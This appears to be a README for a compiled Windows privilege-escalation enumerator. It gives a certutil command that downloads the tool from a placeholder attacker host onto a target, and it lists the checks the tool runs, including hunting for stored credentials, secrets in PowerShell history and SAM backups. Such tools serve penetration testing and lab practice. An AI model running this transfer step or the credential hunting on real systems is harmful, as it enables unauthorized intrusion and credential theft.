# Husky Privesc — Windows EXE

Compiled Windows privilege escalation enumerator. No PowerShell execution policy issues, no encoding problems. Just transfer and run.

---

## Usage

```powershell
# Transfer to target
certutil -urlcache -f http://ATTACKER/privesc.exe C:\Temp\privesc.exe

# Run it
C:\Temp\privesc.exe
```

That's it. No `-ep bypass`, no flags.

---

## What It Checks

- **Token Privileges** — SeImpersonate, SeBackup, SeTcb, SeDebug, SeLoadDriver
- **Group Membership** — Administrators, Backup Operators, Server Operators, DnsAdmins, Domain Admins
- **Services** — Unquoted paths, writable binaries
- **Scheduled Tasks** — Writable task binaries
- **AlwaysInstallElevated** — Registry check
- **Stored Credentials** — cmdkey, AutoLogon, DPAPI
- **PowerShell History** — Searches for passwords/secrets
- **Interesting Files** — SAM/SYSTEM backups, Unattend.xml
- **Internal Services** — MySQL, Redis, PostgreSQL on 127.0.0.1
- **Installed Software** — Non-default apps with version numbers

---

## Rebuilding

```powershell
Install-Module ps2exe -Scope CurrentUser -Force
Import-Module ps2exe
ps2exe .\privesc.ps1 .\privesc.exe
```

---

## License

MIT
